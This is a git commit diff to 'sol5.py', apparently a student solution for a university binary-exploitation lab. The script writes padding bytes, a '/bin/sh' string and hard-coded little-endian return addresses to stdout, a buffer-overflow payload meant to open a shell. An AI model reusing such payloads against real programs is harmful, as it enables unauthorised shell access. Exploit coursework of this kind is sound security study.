5180a0db8030f568b7109ace6271a52ed060ad8b
hanmin <hanmin.umich.edu>
2024-11-15 18:38:52 +0000

    Automatic commit by test script for hanmin

--- sol5.py
+++ sol5.py
@@ -10,9 +10,7 @@ sys.stdout.buffer.write(bin_sh_str)
 
 sys.stdout.buffer.write(b"AAAAAAAA")
 sys.stdout.buffer.write(b"BBBBBBBB")
-sys.stdout.buffer.write(0x7ffffff6d160.to_bytes(8, 'little'))
-sys.stdout.buffer.write(b"AAAAAAAA")
+sys.stdout.buffer.write(b"BBBBBBBB")
+sys.stdout.buffer.write(0x00007ffffff6d160.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x0000000000401ee2.to_bytes(8, 'little'))
 sys.stdout.buffer.write(0x0000000000401e21.to_bytes(8, 'little'))
-sys.stdout.buffer.write(b"AAAAAAAA")
-sys.stdout.buffer.write(0x0000000000401e21.to_bytes(8, 'little'))
-
